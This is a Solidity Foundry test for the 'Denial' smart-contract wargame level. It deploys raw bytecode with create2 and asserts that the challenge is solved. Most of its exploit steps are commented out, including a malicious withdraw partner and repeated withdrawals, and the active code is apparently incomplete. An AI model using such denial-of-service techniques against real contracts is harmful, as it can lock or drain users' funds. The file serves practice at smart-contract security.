// SPDX-License-Identifier: UNLICENSED
// forge test -vvvvv --match-path '*20-Denial.t.sol'
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../contracts/20-Denial.sol";
import "../contracts/20-DenialFactory.sol";
import "../contracts/20-DenialAttack.sol";
import "../lib/forge-std/src/console2.sol";

contract DenialTest is Test {
    DenialFactory public factoryContract;
    address public eoa;
    address public challengeAddress;

    function createUsers(uint256 userNum) internal returns (address[] memory) {
        address[] memory users = new address[](userNum);
        for (uint256 i = 0; i < userNum; i++) {
            // Compute the address from the given priv key
            address user = vm.addr(uint256(keccak256(abi.encodePacked(i))));

            // Fund user with 100 Eth
            vm.deal(user, 100);
            users[i] = user;
        }
        return users;
    }

    function setUp() public {
        // Create EOA and take the 0th (1st) element from the returned array
        eoa = createUsers(1)[0];

        // Deploy factory to create challenge instance
        factoryContract = new DenialFactory();

        // Deploy challenge contract
        challengeAddress = factoryContract.createInstance{value: 1 ether}(address(eoa));
    }

    function afterRun() public returns (bool) {
        return factoryContract.validateInstance(payable(address(challengeAddress)), eoa);
    }

    function testCheck() public {

        bytes memory bytecode = "\x60\x80\x60\x40\x52\x34\x80\x15\x60\x0e\x57\x5f\x80\xfd\x5b\x50\x60\x74\x80\x60\x1a\x5f\x39\x5f\x3f\xfe\x60\x80\x60\x40\x52\x5f\x60\x0f\x57\x60\x0e\x60\x11\x56\x5b\x5b\x00\x5b\x7f\x4e\x48\x7b\x71\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x5f\x52\x60\x01\x60\x04\x52\x60\x24\x5f\xfe\xfe";
        
        bytes32 salt = 0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef;

        address addr;
        assembly {
            addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt)
        }
        require(addr != address(0), "Contract deployment failed");
        console2.log("address:", addr);
        // Deploy attack contract
        // DenialAttack attackContract = new DenialAttack();

        // // Set attack contract as partner
        // Denial challengeContract = Denial(payable(challengeAddress));
        // challengeContract.setWithdrawPartner(address(attackContract));

        // // Call withdraw on challenge contract
        // challengeContract.withdraw();
        // challengeContract.withdraw();

        // uint challengeBalance = challengeContract.contractBalance();
        // console2.log("challengeBalance", challengeBalance);

        bool result = factoryContract.validateInstance(payable(address(challengeAddress)), eoa);
        assertEq(result, true, "Challenge should be solved");

        // uint challengeBalance = challengeContract.contractBalance();

        // uint256 maxInt = 2**256 - 1;

        // uint weiNeeded = maxInt - challengeBalance;

        // // fund the eoa account
        // vm.deal(eoa, weiNeeded);
        // vm.startPrank(eoa, eoa);
        // // send the contract the maximum amount of funds.
        // (bool sent, bytes memory data) = challengeAddress.call{value: weiNeeded}("");
        // require(sent, "Failed to send max Ether");

        // // get contract balance
        // challengeBalance = challengeContract.contractBalance();
        // console2.log("challengeBalance", challengeBalance);

        // // Now we call withdraw 100 times so that it is at maxInt
        // uint sentValue;
        // for (uint256 i = 0; i < 10000; i++) {
        //     sentValue += challengeContract.contractBalance() / 100;
        //     challengeContract.withdraw();
        // }

        // console2.log("sentValue", sentValue);
    
        // Now if we call withdraw again, it should revert
        // uint partnerBalance = challengeContract.withdrawPartnerBalances(address(eoa));
        // console2.log("partnerBalance", partnerBalance); 
        // bool result = factoryContract.validateInstance(payable(address(challengeAddress)), eoa);
        // assertEq(result, true, "Challenge should be solved");
    }
}
